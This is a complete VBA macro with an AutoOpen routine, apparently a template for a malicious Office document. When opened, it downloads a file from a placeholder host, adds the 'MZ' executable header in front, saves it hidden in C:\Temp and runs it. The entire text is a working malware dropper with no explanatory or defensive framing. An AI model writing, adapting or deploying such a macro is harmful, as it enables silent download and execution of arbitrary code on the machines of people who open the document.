Sub AutoOpen()

Const ADTYPEBINARY = 1
Const ADSAVECREATEOVERWRITE = 2

Dim xHttp
Dim bStrm
Dim filename

Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "https://<DOMAIN>/<FILE>", False
xHttp.Send

Set gobjBinaryOutputStream = CreateObject("Adodb.Stream")

filename = "C:\Temp\" & DateDiff("s", #1/1/1970#, Now())

gobjBinaryOutputStream.Type = ADTYPEBINARY
gobjBinaryOutputStream.Open
gobjBinaryOutputStream.write CreateObject("System.Text.ASCIIEncoding").GetBytes_4("M")
gobjBinaryOutputStream.write CreateObject("System.Text.ASCIIEncoding").GetBytes_4("Z")
gobjBinaryOutputStream.write xHttp.responseBody
gobjBinaryOutputStream.savetofile filename, ADSAVECREATEOVERWRITE

SetAttr filename, vbReadOnly + vbHidden + vbSystem
Shell (filename)

End Sub
